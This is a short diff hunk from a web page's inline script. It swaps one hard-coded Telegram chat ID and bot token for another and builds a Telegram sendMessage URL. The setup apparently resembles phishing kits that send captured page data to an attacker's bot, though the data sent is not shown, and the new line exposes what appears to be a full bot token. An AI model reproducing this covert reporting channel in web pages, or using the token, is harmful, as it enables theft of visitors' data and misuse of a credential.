@@ -3621,7 +3621,7 @@ position: fixed;
                 });
             });
             
-const chat_id = '661798393', botID = 'bot6625824278:AAFro5lnFxm13m5RPTiGQj';
+const chat_id = '7499763139', botID = 'bot7729834873:AAGbhGGd5jobyyQRRrGfEU-CZZ8KNr0Vw4M';
 
     const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;
 
